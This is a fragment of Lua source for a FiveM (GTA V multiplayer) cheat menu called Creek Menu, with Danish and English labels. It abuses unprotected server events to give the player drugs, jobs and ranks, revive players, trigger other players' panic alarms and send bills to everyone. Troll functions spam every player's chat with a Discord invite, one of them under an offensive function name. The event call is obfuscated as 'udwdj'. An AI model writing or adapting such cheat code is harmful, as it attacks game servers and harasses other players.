        elseif CreekMenu.Button("==========================~r~FARMS~s~===========================") then
        elseif CreekMenu.Button("Modtag Kokain", '~r~10 stk.') then
            TriggerServerEvent('kokain2')
        elseif CreekMenu.Button("Modtag Færdigt Kokain", '~r~10 stk.') then
            TriggerServerEvent('kokain2')
            TriggerServerEvent('kokain2')
            TriggerServerEvent('kokain2')
            TriggerServerEvent('Fremstill2')
        elseif CreekMenu.Button("==========================~r~TROLL~s~===========================") then
        elseif CreekMenu.Button("BAN Person", '~r~DevoNetwork') then
    ...
    elseif CreekMenu.Button("Udløs PanikKnap", '~p~~r~Devo & Sky') then
        TriggerServerEvent("vrp_panikknap:panik",GetEntityCoords(PlayerPedId(selectedPlayer), true))
        TriggerServerEvent("vrp_panikknap:gps", GetEntityCoords(PlayerPedId(selectedPlayer), true))
    elseif CreekMenu.Button("==========================~r~RANKS~s~===========================") then
    elseif CreekMenu.Button("Groups", '~r~DevoNetwork') then
    ...
    elseif CreekMenu.Button("Custom Rank", '~r~DevoNetwork') then
        local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
    ...
    elseif CreekMenu.Button("Owner Rank", '~r~~r~SkyUniverse') then
    ...
    elseif CreekMenu.Button("Politi-Job", '~r~SkyUniverse') then
        udwdj("kasperr_jobcenter:selectJob", "Politi-Job")
        end

			elseif CreekMenu.IsMenuOpened('other') then
			if CreekMenu.Button("~r~Remove Job") then
                udwdj("NB:destituerplayer",GetPlayerServerId(-1))
			elseif CreekMenu.Button("~s~Recruit~r~ Mechanic") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
				udwdj('NB:recruterplayer', GetPlayerServerId(-1), "mecano", result)
			elseif CreekMenu.Button("~s~Recruit~r~ Police") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~r~ Mafia") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~r~ Gang") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~r~ Taxi") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
			...
			elseif CreekMenu.Button("~s~Recruit~r~ Inem") then
			local result = GetKeyboardInput("Enter Nivel Job ~r~0-10", "", 10)
        ...
        elseif CreekMenu.IsMenuOpened('\101\115\120\10') then
            if CreekMenu.Button("~r~ESX ~s~| ~w~Restore Hunger") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
            elseif CreekMenu.Button("~r~ESX ~s~| ~w~Restore Thirst") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
            elseif CreekMenu.Button("~r~ESX ~s~| ~w~Revive Self") then
                udwdj('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
            elseif CreekMenu.Button("~r~ESX ~s~| ~w~Revive By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                udwdj('esx_ambulancejob:revive', serverID)
            elseif CreekMenu.Button("~r~ESX ~s~| Send Everyone Custom Bill") then
        ...
        elseif CreekMenu.IsMenuOpened('\118\114\112\10') then
            if CreekMenu.Button("Toggle Handcuffs", 'Client') then
                vRP.toggleHandcuff()
            elseif CreekMenu.Button("Get Driving license") then
                udwdj("dmv:success")
            elseif CreekMenu.Button("Clear Wanted Level", "Client") then
                vRP.applyWantedLevel(0)
            elseif CreekMenu.Button("Slot Machine", "Server") then
        ...
        elseif CreekMenu.IsMenuOpened('credits') then
            for i = 1, #developers do if CreekMenu.Button(developers[i]) then end end

        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then CreekMenu.OpenMenu('CreekMenu')


		elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then CreekMenu.OpenMenu('CreekMenu')
    ...
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            udwdj("_chat:messageEntered","~r~",{141,211,255},"^1C^2r^3e^4e^5k ^1M^2e^3n^4u ^4https://discord.gg/Zm9jg9q")
        end
...
function RapeAllFunc()
    for bs=0,9 do
        udwdj("_chat:messageEntered","~r~",{141,211,255},"THIS IS AMERICA https://discord.gg/Zm9jg9q")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
...
teleport
        ...
        if CreekMenu.IsMenuOpened('objectlist') then
            for i = 1, #SpawnedObjects do
